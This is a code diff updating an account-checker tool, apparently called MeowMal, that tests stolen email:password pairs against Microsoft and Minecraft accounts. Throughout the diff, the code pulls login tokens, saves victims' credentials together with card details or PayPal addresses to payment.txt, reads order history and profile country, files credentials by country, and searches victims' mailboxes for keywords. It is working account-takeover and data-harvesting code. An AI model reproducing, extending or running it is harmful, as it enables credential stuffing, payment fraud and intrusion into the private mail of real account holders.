@@ -33,17 +33,76 @@ colorama_init(autoreset=False, strip=False)
 file_lock = threading.Lock()
 proxy_lock = threading.Lock()
 
+
+_write_buffer = {}  
+_write_buffer_lock = threading.Lock()
+_write_seen = {}  
+_WRITE_FLUSH_THRESHOLD = 1
+
+def _flush_write_buffer(path=None):
+
+    with _write_buffer_lock:
+        paths_to_flush = [path] if path else list(_write_buffer.keys())
+    for p in paths_to_flush:
+        with _write_buffer_lock:
+            entries = _write_buffer.pop(p, [])
+        if not entries:
+            continue
+        try:
+            dir_path = os.path.dirname(p)
+            if dir_path:
+                os.makedirs(dir_path, exist_ok=True)
+            with open(p, 'a', encoding='utf-8') as f:
+                f.write(''.join(entries))
+                f.flush()
+        except Exception:
+            pass
+
+def _flush_all_buffers_periodic():
+
+    while True:
+        time.sleep(2)
+        try:
+            _flush_write_buffer()
+        except Exception:
+            pass
+
+threading.Thread(target=_flush_all_buffers_periodic, daemon=True).start()
+
 def write_dedupe(fname, filename, content):
-    with file_lock:
-        path = f'results/{fname}/{filename}'
-        if os.path.exists(path):
+    path = f'results/{fname}/{filename}'
+    content_key = content.strip()
+    with _write_buffer_lock:
+        if path not in _write_seen:
+            _write_seen[path] = set()
+
             try:
-                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-                    if content.strip() in f.read():
-                        return
-            except: pass
-        with open(path, 'a', encoding='utf-8', buffering=1) as f:
-            f.write(content)
+                if os.path.exists(path):
+                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                        for line in f:
+                            _write_seen[path].add(line.strip())
+            except Exception:
+                pass
+        if content_key in _write_seen[path]:
+            return
+        _write_seen[path].add(content_key)
+        if path not in _write_buffer:
+            _write_buffer[path] = []
+        _write_buffer[path].append(content)
+        should_flush = len(_write_buffer[path]) >= _WRITE_FLUSH_THRESHOLD
+    if should_flush:
+        _flush_write_buffer(path)
+
+def safe_write_file(filepath, content, mode='a'):
+
+    dir_path = os.path.dirname(filepath)
+    if dir_path:
+        try:
+            os.makedirs(dir_path, exist_ok=True)
+        except Exception:
+            pass
+    with open(filepath, mode, encoding='utf-8') as f:
+        f.write(content)
 
 def get_optimized_timeout(config=None):
     timeout_val = int(config.get('timeout', 15)) if config else 15
@@ -58,9 +117,9 @@ if sys.platform == 'win32':
             sys.stdout.reconfigure(encoding='utf-8', errors='replace')
             sys.stderr.reconfigure(encoding='utf-8', errors='replace')
         else:
-            import codecs
-            sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, errors='replace')
-            sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, errors='replace')
+            import io
+            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)
+            sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace', line_buffering=True)
     except Exception:
         pass
 class SimpleUtils:
@@ -279,9 +338,7 @@ def validate_hex_color(color_str):
             except ValueError:
                 pass
     return None
-import urllib.parse
-from urllib.parse import urlparse, parse_qs
-from io import StringIO
+
 UI_ENABLED = True
 try:
     from minecraft.networking.connection import Connection
@@ -326,6 +383,8 @@ FIRST_LOGIN = re.compile(r'(?<=<b>First login: </b>).+?(?=<br/><b>)')
 LAST_LOGIN = re.compile(r'(?<=<b>Last login: </b>).+?(?=<br/>)')
 BW_STARS = re.compile(r'(?<=<li><b>Level:</b> ).+?(?=</li>)')
 SB_NETWORTH = re.compile(r'(?<= Networth: ).+?(?=\\n)')
+autopay_count = 0
+
 class UIManager:
     def __init__(self):
         self.width = 120
@@ -340,7 +399,7 @@ class UIManager:
         self._cached_stats = {}
         self._cached_colors = None
         self._cached_ascii_logo = None
-        self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0, 'banned': 0, 'unbanned': 0}
+        self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'autopay': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0, 'banned': 0, 'unbanned': 0}
         self.start_time = None
         self._lock = threading.Lock()
     def reset_log_area(self):
@@ -360,7 +419,7 @@ class UIManager:
         if not getattr(self, 'log_initialized', False):
             self.clear_screen()
             _title = Fore.CYAN
-            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: 1.2 | Dev: MeowMal Dev's \n"
+            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: 1.3 | Dev: MeowMal Dev's \n"
             print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
             print('')
             print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
@@ -368,15 +427,9 @@ class UIManager:
         return
     def screen_ui_log(self):
         return self.show_ui_screen()
-    def log_info(self, message):
-        print(f'{Fore.CYAN}[INFO] {message}{Fore.RESET}')
-    def log_error(self, message):
-        print(f'{Fore.RED}[ERROR] {message}{Fore.RESET}')
     def show_error_screen(self, error_msg):
         self.log_error(error_msg)
-    def increment_stat(self, stat_name):
-        if stat_name in self.stats:
-            self.stats[stat_name] += 1
+
     def show_finished_screen(self, results_folder):
         self.clear_screen()
         elapsed = self._get_elapsed_time()
@@ -400,67 +453,54 @@ class UIManager:
         print(f'{Fore.GREEN} ✓ CHECKING COMPLETED! {Fore.RESET}')
         print(f"{Fore.CYAN}{'═' * 83}{Fore.RESET}\n")
         print(f'{Fore.WHITE}Time: {Fore.CYAN}{elapsed}{Fore.RESET}')
-        print(f"{Fore.WHITE}Hits: {Fore.GREEN}{self.stats['hits']}{Fore.RESET}")
-        print(f'{Fore.WHITE}Unbanned: {Fore.GREEN}{unbanned_count}{Fore.RESET}')
+        print(f"{Fore.WHITE}Valid Mail: {Fore.GREEN}{self.stats.get('valid_mail', 0)}{Fore.RESET}")
+        print(f"{Fore.WHITE}Bad: {Fore.RED}{self.stats.get('bad', 0)}{Fore.RESET}")
+        print(f"{Fore.WHITE}2FA: {Fore.YELLOW}{self.stats.get('twofa', 0)}{Fore.RESET}")
+        print(f"{Fore.WHITE}Minecraft Hits: {Fore.GREEN}{self.stats.get('hits', 0)}{Fore.RESET}")
+        print(f"{Fore.WHITE}DonutSMP AutoPay: {Fore.LIGHTCYAN_EX}{self.stats.get('autopay', 0)}{Fore.RESET}")
+        print(f"{Fore.WHITE}Unbanned: {Fore.GREEN}{unbanned_count}{Fore.RESET}")
         print(f'{Fore.WHITE}Banned: {Fore.RED}{banned_count}{Fore.RESET}')
-        print(f"{Fore.WHITE}Xgp: {Fore.LIGHTBLUE_EX}{self.stats['xgp']}{Fore.RESET}")
-        print(f"{Fore.WHITE}Xgpu: {Fore.LIGHTCYAN_EX}{self.stats['xgpu']}{Fore.RESET}")
-        print(f"{Fore.WHITE}Sfa: {Fore.YELLOW}{self.stats['sfa']}{Fore.RESET}\n")
+        print(f"{Fore.WHITE}XGP: {Fore.LIGHTBLUE_EX}{self.stats.get('xgp', 0)}{Fore.RESET}")
+        print(f"{Fore.WHITE}XGPU: {Fore.LIGHTCYAN_EX}{self.stats.get('xgpu', 0)}{Fore.RESET}")
+        print(f"{Fore.WHITE}SFA: {Fore.YELLOW}{self.stats.get('sfa', 0)}{Fore.RESET}\n")
     def add_log(self, message, level='INFO'):
-
-        if level not in ('HIT', 'ERROR') and not (level == 'INFO' and message.startswith('Other:')):
-            return
         with self._lock:
+
+            if level not in ('HIT', 'BAD', '2FA', 'VALID_MAIL', 'AUTOPAY'):
+                if not (level == 'SUCCESS' and 'Valid Mail' in message):
+                    return
             if level == 'HIT':
                 log_entry = message
-            elif level == 'ERROR':
-                log_entry = f'{Fore.RED}[+] {message}{Style.RESET_ALL}'
-
-                log_entry = f'{Fore.LIGHTGREEN_EX}[+] {Fore.LIGHTYELLOW_EX}{message}{Style.RESET_ALL}'
+            elif level == 'BAD':
+                log_entry = f'{Fore.RED}[BAD]{Style.RESET_ALL} {message}' if not message.startswith('\x1b') else message
+            elif level == '2FA':
+                log_entry = f'{Fore.MAGENTA}[2FA]{Style.RESET_ALL} {message}' if not message.startswith('\x1b') else message
+            elif level in ('VALID_MAIL', 'SUCCESS'):
+                log_entry = f'{Fore.GREEN}[VALID MAIL]{Style.RESET_ALL} {message}' if not message.startswith('[VALID MAIL]') and not message.startswith('\x1b') else message
+            elif level == 'AUTOPAY':
+                log_entry = f'{Fore.CYAN}[DONUT SMP AUTOPAY]{Style.RESET_ALL} {message}'
+            else:
+                log_entry = message
             self.logs.append(log_entry)
             if len(self.logs) > self.max_logs:
                 self.logs = self.logs[-self.max_logs:]
             try:
-                if getattr(self, 'cui_initialized', False):
-                    log_start_line = getattr(self, 'log_start_line', max(5, self.height - 25))
-                    log_line = log_start_line + 2 + self.log_area_count
-                    if log_line >= self.height - 2:
-                        self.reset_log_area()
-                        log_line = log_start_line + 2
-                    print(f'\x1b[{log_line};0H{log_entry}\x1b[K\x1b[{self.height};0H', end='', flush=True)
-                    self.log_area_count += 1
-                    if self.log_area_count >= getattr(self, 'log_area_limit', 20):
-                        self.reset_log_area()
-                else:
-                    if getattr(self, 'log_initialized', False):
-                        print(f'{log_entry}\x1b[K', flush=True)
-                    else:
-                        print(log_entry, flush=True)
-            except Exception as e:
-                print(f'Debug: add_log error: {e}')
+                print(log_entry, flush=True)
+            except Exception:
                 pass
     def log_hit_formatted(self, capture_obj, extra_stats=None, precomputed_line=None):
         try:
             elapsed_str = self._get_elapsed_time()
             time_part = f'[{elapsed_str}]'
-            if capture_obj.banned and str(capture_obj.banned).startswith('[Error]'):
-                status_part = '[Error]'
-                color = Fore.YELLOW
-            elif capture_obj.banned and capture_obj.banned != 'False' and not str(capture_obj.banned).startswith('[Unchecked]'):
+            if capture_obj.banned and capture_obj.banned != 'False' and not str(capture_obj.banned).startswith('[Unchecked]') and not str(capture_obj.banned).startswith('[Error]'):
                 status_part = '[Banned]'
                 color = Fore.RED
-            elif capture_obj.banned == 'False':
+            elif capture_obj.banned == 'False' or str(capture_obj.banned).startswith('[Error]') or str(capture_obj.banned).startswith('[Unchecked]'):
                 status_part = '[Unbanned]'
                 color = Fore.GREEN
-            elif capture_obj.banned and str(capture_obj.banned).startswith('[Unchecked]'):
-                if 'No Profile' in capture_obj.banned:
-                    status_part = '[No Profile]'
-                else:
-                    status_part = '[Unchecked]'
-                color = Fore.YELLOW
             else:
-                status_part = f"[{capture_obj.banned or 'Unknown'}]"
-                color = Fore.YELLOW
+                status_part = '[Unbanned]'
+                color = Fore.GREEN
             
             if capture_obj.hypixl and ('[' in capture_obj.hypixl or ']' in capture_obj.hypixl) and capture_obj.hypixl != 'N/A':
                 color = Fore.CYAN
@@ -517,7 +557,6 @@ class UIManager:
                 stats_parts.append(f'Pit_Coins: {capture_obj.pitcoins}')
             
             stats_part = ''
-            stats_part = ''
             if stats_parts:
                 stats_part = ' [Hypixel: ' + ', '.join(stats_parts) + ']'
             elif extra_stats:
@@ -542,11 +581,13 @@ class UIManager:
     def log_hit(self, email, account_type):
         self.add_log(f'HIT: {email} | Type: {account_type}', 'HIT')
     def log_bad(self, email):
-        return
+        self.add_log(f'{Fore.RED}[BAD]{Style.RESET_ALL} {email}', 'BAD')
     def log_2fa(self, email):
-        return
+        self.add_log(f'{Fore.MAGENTA}[2FA]{Style.RESET_ALL} {email}', '2FA')
+    def log_valid_mail(self, email):
+        self.add_log(f'{Fore.GREEN}[VALID MAIL]{Style.RESET_ALL} {email}', 'VALID_MAIL')
     def log_payment(self, email, details):
-        self.add_log(f'PAYMENT: {email} | {details}', 'PAYMENT')
+        pass
     def log_error(self, message):
         self.add_log(message, 'ERROR')
         self.increment_stat('errors')
@@ -569,8 +610,6 @@ class UIManager:
         if total == 0:
             return '0.0%'
         return f'{value / total * 100:.1f}%'
-    def _strip_ansi(self, text):
-        return ANSI_ESCAPE.sub('', text)
 ui = UIManager()
 class MicrosoftChecker:
     def __init__(self, session, email, password, config, fname):
@@ -589,14 +628,36 @@ class MicrosoftChecker:
                 return token_data['token']
         try:
             auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri={redirect_uri}&prompt=none'
-            r = self.session.get(auth_url, timeout=int(self.config.get('timeout', 10)))
-            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
-            if token:
-                self._token_cache[cache_key] = {'token': token, 'timestamp': time.time()}
-            else:
+            timeout_sec = int(self.config.get('timeout', 10))
+            token = None
+            try:
+                r = self.session.get(auth_url, timeout=timeout_sec, allow_redirects=False)
+                loc = r.headers.get('Location', '')
+                if 'access_token=' in loc:
+                    token = urllib.parse.unquote(loc.split('access_token=')[1].split('&')[0])
+                elif r.status_code == 200 and 'access_token=' in r.text:
+                    token = urllib.parse.unquote(r.text.split('access_token=')[1].split('&')[0].split('"')[0].split("'")[0])
+            except Exception:
                 pass
-            return token
-        except (requests.RequestException, TimeoutError, ConnectionError) as e:
+            if not token:
+                try:
+                    r2 = self.session.get(auth_url, timeout=timeout_sec, allow_redirects=True)
+                    for resp in getattr(r2, 'history', []):
+                        hloc = resp.headers.get('Location', '')
+                        if 'access_token=' in hloc:
+                            token = urllib.parse.unquote(hloc.split('access_token=')[1].split('&')[0])
+                            break
+                    if not token and 'access_token=' in getattr(r2, 'url', ''):
+                        token = parse_qs(urlparse(r2.url).fragment).get('access_token', [None])[0]
+                    if not token and 'access_token=' in getattr(r2, 'text', ''):
+                        token = urllib.parse.unquote(r2.text.split('access_token=')[1].split('&')[0].split('"')[0].split("'")[0])
+                except Exception:
+                    pass
+            if token and len(token) > 10 and token.lower() != 'none':
+                self._token_cache[cache_key] = {'token': token, 'timestamp': time.time()}
+                return token
+            return None
+        except Exception:
             return None
     def check_balance(self):
         try:
@@ -651,32 +712,58 @@ class MicrosoftChecker:
             return None
     def check_payment_instruments(self):
         try:
-            token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
-            if not token:
-                return []
-            headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
-            r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=15)
             instruments = []
-            if r.status_code == 200:
+            token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
+            if token:
+                headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
+                r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=15)
+                if r.status_code == 200:
+                    try:
+                        data = r.json()
+                        for item in data:
+                            if 'paymentMethod' in item:
+                                pm = item['paymentMethod']
+                                family = pm.get('paymentMethodFamily')
+                                type_ = pm.get('paymentMethodType')
+                                if family == 'credit_card':
+                                    last4 = pm.get('lastFourDigits', 'N/A')
+                                    expiry = f"{pm.get('expiryMonth', '')}/{pm.get('expiryYear', '')}"
+                                    card_line = f'{self.email}:{self.password} | CC: {type_} *{last4} ({expiry})\n'
+                                    write_dedupe(self.fname, 'payment.txt', card_line)
+                                    instruments.append(f'CC: {type_} *{last4} ({expiry})')
+                                elif family == 'paypal':
+                                    email = pm.get('email', 'N/A')
+                                    paypal_line = f'{self.email}:{self.password} | PayPal: {email}\n'
+                                    write_dedupe(self.fname, 'payment.txt', paypal_line)
+                                    instruments.append(f'PayPal: {email}')
+                    except Exception:
+                        pass
+            if not instruments:
                 try:
-                    data = r.json()
-                    for item in data:
-                        if 'paymentMethod' in item:
-                            pm = item['paymentMethod']
-                            family = pm.get('paymentMethodFamily')
-                            type_ = pm.get('paymentMethodType')
-                            if family == 'credit_card':
-                                last4 = pm.get('lastFourDigits', 'N/A')
-                                expiry = f"{pm.get('expiryMonth', '')}/{pm.get('expiryYear', '')}"
-                                instruments.append(f'CC: {type_} *{last4} ({expiry})')
-                            elif family == 'paypal':
-                                email = pm.get('email', 'N/A')
-                                instruments.append(f'PayPal: {email}')
-                except:
+                    r2 = self.session.get('https://account.microsoft.com/billing/api/payment-methods', timeout=12)
+                    if r2.status_code == 200 and ('credit_card' in r2.text.lower() or 'paypal' in r2.text.lower() or 'card' in r2.text.lower()):
+                        card_line = f'{self.email}:{self.password} | Payment Method Found\n'
+                        write_dedupe(self.fname, 'payment.txt', card_line)
+                        instruments.append('Payment Method Found')
+                except Exception:
                     pass
             return instruments
         except Exception:
             return []
+    def get_graph_token(self):
+        if hasattr(self, '_graph_token') and self._graph_token:
+            return self._graph_token
+        scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read'
+        token = self.get_auth_token('0000000048170EF2', scope, 'https://login.live.com/oauth20_desktop.srf')
+        if not token:
+            token = self.get_auth_token('0000000048170EF2', 'https://graph.microsoft.com/Mail.Read', 'https://login.live.com/oauth20_desktop.srf')
+        if not token:
+            token = self.get_auth_token('0000000048170EF2', 'https://graph.microsoft.com/User.Read', 'https://login.live.com/oauth20_desktop.srf')
+        if not token:
+            token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
+        if token:
+            self._graph_token = token
+        return token
     def check_subscriptions(self):
         try:
             r = self.session.get('https://account.microsoft.com/services/api/subscriptions', timeout=15)
@@ -713,72 +800,282 @@ class MicrosoftChecker:
             return addresses
         except Exception:
             return []
-
-    def check_inbox(self, keywords):
+    def check_order_history(self):
         try:
-            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
-            token = self.get_auth_token('0000000048170EF2', scope, 'https://login.live.com/oauth20_desktop.srf')
-            if not token:
-                token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
-            if not token:
-                if UI_ENABLED and ui:
-                    ui.log_error("Inbox: Failed to get auth token")
-                return []
-            cid = self.session.cookies.get('MSPCID')
-            if not cid:
+            r = self.session.get('https://account.microsoft.com/orders/api/history', timeout=12)
+            orders = []
+            if r.status_code == 200:
                 try:
-                    self.session.get('https://outlook.live.com/owa/', timeout=10)
-                    cid = self.session.cookies.get('MSPCID')
-                except:
+                    data = r.json()
+                    for item in data.get('orders', []):
+                        desc = item.get('description', '') or item.get('title', '')
+                        if desc:
+                            orders.append(desc)
+                except Exception:
                     pass
-            if not cid:
-                cid = self.email
-            headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Host': 'substrate.office.com'}
-            results = []
-            for keyword in keywords:
-                try:
-                    payload = {'Cvid': str(uuid.uuid4()), 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'Egypt Standard Time', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': keyword}, 'RefiningQueries': None, 'Size': 25, 'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}], 'EnableTopResults': True, 'TopResultsCount': 3}], 'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}], 'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True, 'SupportedRecourseDisplayTypes': ['Suggestion', 'NoResultModification', 'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification']}, 'LogicalId': str(uuid.uuid4())}
-                    r = self.session.post('https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124', json=payload, headers=headers, timeout=15)
-                    found = 0
+            return orders
+        except Exception:
+            return []
+    def check_country(self):
+
+        country = "Unknown"
+        displayName = "Unknown"
+
+
+        try:
+            token = self.get_graph_token()
+            if token:
+                headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+                r = self.session.get("https://graph.microsoft.com/v1.0/me", headers=headers, timeout=8)
+                if r.status_code == 200:
+                    data = r.json()
+                    country = data.get("country", data.get("mobilePhone", "Unknown"))
+                    displayName = data.get("displayName", "Unknown")
+                    if not country or country == "Unknown":
+                        r2 = self.session.get("https://graph.microsoft.com/v1.0/me/mailboxSettings", headers=headers, timeout=8)
+                        if r2.status_code == 200:
+                            country = r2.json().get("timeZone", "Unknown")
+        except Exception:
+            pass
+
+
+        if not country or country == "Unknown":
+            try:
+                sub_token = self.get_auth_token('0000000048170EF2', 'https://substrate.office.com/User-Internal.ReadWrite', 'https://login.live.com/oauth20_desktop.srf')
+                if not sub_token:
+                    sub_token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
+                if sub_token:
+                    cid = self.session.cookies.get("MSPCID", self.email)
+                    headers = {
+                        "Authorization": f"Bearer {sub_token}",
+                        "X-AnchorMailbox": f"CID:{cid}",
+                        "Content-Type": "application/json",
+                        "User-Agent": "Outlook-Android/2.0",
+                        "Accept": "application/json"
+                    }
+                    r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=8)
                     if r.status_code == 200:
                         data = r.json()
-                        if 'EntitySets' in data:
-                            for entity_set in data['EntitySets']:
-                                if 'ResultSets' in entity_set:
-                                    for result_set in entity_set['ResultSets']:
-                                        if 'Total' in result_set:
-                                            found += result_set['Total']
-                                        elif 'ResultCount' in result_set:
-                                            found += result_set['ResultCount']
-                                        elif 'Results' in result_set:
-                                            found += len(result_set['Results'])
-                    else:
-                        if UI_ENABLED and ui:
-                            ui.log_error(f"Inbox API Error ({keyword}): {r.status_code} - {r.text[:100]}")
-                        if r.status_code in (401, 403, 404):
-                            break
-                    
-                    if found == 0:
-                        try:
-                            rest_r = self.session.get(f'https://outlook.live.com/api/v2.0/me/messages?$search=%22{keyword}%22&$top=10&$select=Subject,ReceivedDateTime', headers=headers, timeout=10)
-                            if rest_r.status_code == 200:
-                                msgs = rest_r.json().get('value', [])
-                                found = len(msgs)
-                            elif rest_r.status_code in (401, 403, 404):
-                                break
-                        except: pass
+                        country = data.get("accounts", [{}])[0].get("location", "Unknown")
+                        if displayName == "Unknown":
+                            displayName = data.get("names", [{}])[0].get("displayName", "Unknown")
+            except Exception:
+                pass
 
-                    if found > 0:
-                        results.append((keyword, found))
-                except Exception as e:
-                    if UI_ENABLED and ui:
-                        ui.log_error(f"Inbox Keyword Error ({keyword}): {str(e)[:50]}")
+
+        if not country or country == "Unknown":
+            try:
+                r_prof = self.session.get("https://account.microsoft.com/api/account/profile", headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Referer": "https://account.microsoft.com/"}, timeout=8)
+                if r_prof.status_code == 200:
+                    d = r_prof.json()
+                    for k in ["CountryCode", "countryCode", "country", "Country", "usercountry"]:
+                        if k in d and d[k] and len(str(d[k])) >= 2:
+                            country = str(d[k])
+                            break
+            except Exception:
+                pass
+
+
+        if not country or country == "Unknown":
+            try:
+                jwt_cookie = self.session.cookies.get("AMCSecAuthJWT", "")
+                if jwt_cookie and "." in jwt_cookie:
+                    payload = jwt_cookie.split(".")[1]
+                    import base64
+                    padded = payload + "=" * ((4 - len(payload) % 4) % 4)
+                    claims = json.loads(base64.urlsafe_b64decode(padded.encode()).decode("utf-8", "ignore"))
+                    ctry = claims.get("ctry") or claims.get("country")
+                    if ctry:
+                        country = str(ctry)
+            except Exception:
+                pass
+
+
+        if not country or country == "Unknown":
+            try:
+                domain = self.email.split("@")[-1].lower()
+                tld_map = {
+                    ".jp": "Japan", ".co.jp": "Japan",
+                    ".de": "Germany",
+                    ".uk": "United_Kingdom", ".co.uk": "United_Kingdom",
+                    ".fr": "France",
+                    ".it": "Italy",
+                    ".es": "Spain",
+                    ".ca": "Canada",
+                    ".au": "Australia", ".com.au": "Australia",
+                    ".br": "Brazil", ".com.br": "Brazil",
+                    ".ru": "Russia",
+                    ".in": "India", ".co.in": "India",
+                    ".nl": "Netherlands",
+                    ".se": "Sweden",
+                    ".no": "Norway",
+                    ".dk": "Denmark",
+                    ".fi": "Finland",
+                    ".pl": "Poland",
+                    ".tr": "Turkey", ".com.tr": "Turkey",
+                    ".mx": "Mexico", ".com.mx": "Mexico",
+                    ".ar": "Argentina", ".com.ar": "Argentina",
+                    ".ch": "Switzerland",
+                    ".at": "Austria",
+                    ".be": "Belgium",
+                    ".nz": "New_Zealand", ".co.nz": "New_Zealand",
+                    ".sg": "Singapore", ".com.sg": "Singapore",
+                    ".za": "South_Africa", ".co.za": "South_Africa"
+                }
+                for tld, c_name in tld_map.items():
+                    if domain.endswith(tld):
+                        country = c_name
+                        break
+            except Exception:
+                pass
+
+        formatted_country = format_country_name(country)
+        if formatted_country and formatted_country != "Unknown":
+            try:
+                write_dedupe(self.fname, f'Country/{formatted_country}.txt', f'{self.email}:{self.password}\n')
+            except Exception:
+                pass
+        return formatted_country
+
+    def check_inbox(self, keywords):
+        
+        try:
+            token = self.get_graph_token()
+            results = []
+            if token:
+                headers = {
+                    "Authorization": f"Bearer {token}",
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0",
+                    "ConsistencyLevel": "eventual"
+                }
+                def _search_one(kw):
+                    try:
+                        q = f'https://graph.microsoft.com/v1.0/me/messages?$search="subject:{kw}"&$select=subject,receivedDateTime&$top=25'
+                        r = self.session.get(q, headers=headers, timeout=8)
+                        if r.status_code == 200:
+                            data = r.json()
+                            n = data.get("@odata.count", 0)
+                            if n == 0 and "value" in data:
+                                n = len(data["value"])
+                            if n > 0:
+                                return kw, n
+
+                        q2 = f'https://graph.microsoft.com/v1.0/me/messages?$search="{kw}"&$select=subject,receivedDateTime&$top=25'
+                        r2 = self.session.get(q2, headers=headers, timeout=8)
+                        if r2.status_code == 200:
+                            data2 = r2.json()
+                            n2 = data2.get("@odata.count", 0)
+                            if n2 == 0 and "value" in data2:
+                                n2 = len(data2["value"])
+                            if n2 > 0:
+                                return kw, n2
+                    except Exception:
+                        pass
+                    return None
+
+                with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(keywords), 8)) as executor:
+                    futures = [executor.submit(_search_one, kw) for kw in keywords if kw]
+                    for f in concurrent.futures.as_completed(futures):
+                        res = f.result()
+                        if res:
+                            results.append(res)
+
+
+            if not results:
+                try:
+                    try:
+                        self.session.get("https://outlook.live.com/owa/", timeout=6)
+                    except Exception:
+                        pass
+                    sub_token = self.get_auth_token('0000000048170EF2', 'https://substrate.office.com/User-Internal.ReadWrite', 'https://login.live.com/oauth20_desktop.srf')
+                    if not sub_token:
+                        sub_token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
+                    if sub_token:
+                        cid = self.session.cookies.get('MSPCID', self.email)
+                        sub_headers = {'Authorization': f'Bearer {sub_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
+                        for kw in keywords:
+                            try:
+                                payload = {'Cvid': str(uuid.uuid4()), 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'From': 0, 'Query': {'QueryString': kw}, 'Size': 25}], 'LogicalId': str(uuid.uuid4())}
+                                r = self.session.post('https://outlook.live.com/search/api/v2/query?n=124', json=payload, headers=sub_headers, timeout=8)
+                                if r.status_code == 200:
+                                    d = r.json()
+                                    found = 0
+                                    for es in d.get('EntitySets', []):
+                                        for rs in es.get('ResultSets', []):
+                                            found += rs.get('Total', len(rs.get('Results', [])))
+                                    if found > 0:
+                                        results.append((kw, found))
+                            except Exception:
+                                pass
+                except Exception:
                     pass
+
             return results
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f"Inbox Searcher Error: {str(e)[:50]}")
             return []
+
+COUNTRY_NAMES = {
+    "US": "United_States", "USA": "United_States", "UNITED STATES": "United_States",
+    "IN": "India", "INDIA": "India",
+    "DE": "Germany", "GERMANY": "Germany",
+    "GB": "United_Kingdom", "UK": "United_Kingdom", "GREAT BRITAIN": "United_Kingdom",
